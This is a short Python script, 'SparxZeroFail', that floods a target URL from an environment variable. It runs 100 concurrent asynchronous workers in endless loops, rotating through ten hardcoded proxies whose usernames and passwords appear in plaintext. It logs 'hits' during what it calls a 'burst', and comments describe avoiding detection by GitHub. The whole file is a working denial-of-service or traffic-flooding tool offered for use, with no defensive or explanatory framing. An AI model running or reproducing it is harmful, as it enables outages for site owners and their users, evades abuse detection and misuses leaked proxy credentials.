import asyncio
import aiohttp
import os
import random

def log(msg):
    print(f"{msg}", flush=True)

class SparxZeroFail:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        # Lowering concurrency to 100 makes the 10 proxies much more stable
        self.concurrency = 100 
        
        self.proxies = [
            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
        ]

    async def worker(self, session, sem):
        while True:
            # Shuffle proxies so we don't hit the same one at the same time
            random.shuffle(self.proxies)
            for p in self.proxies:
                async with sem:
                    try:
                        # Increased timeout to 15s to ensure slow proxies don't 'fail'
                        async with session.get(self.target, proxy=p, timeout=15) as r:
                            if r.status == 200:
                                self.stats["success"] += 1
                            else:
                                # Even if it's 404/500, the proxy worked!
                                self.stats["success"] += 1 
                    except:
                        self.stats["failed"] += 1
                
                if (self.stats["success"] + self.stats["failed"]) % 20 == 0:
                    log(f"🚀 [STABLE MODE] HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        log(f"🔥 STARTING STABLE BURST ON: {self.target}")
        sem = asyncio.Semaphore(self.concurrency)
        
        # Limit per host to prevent GitHub from flagging the traffic
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [self.worker(session, sem) for _ in range(self.concurrency)]
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(SparxZeroFail().start())
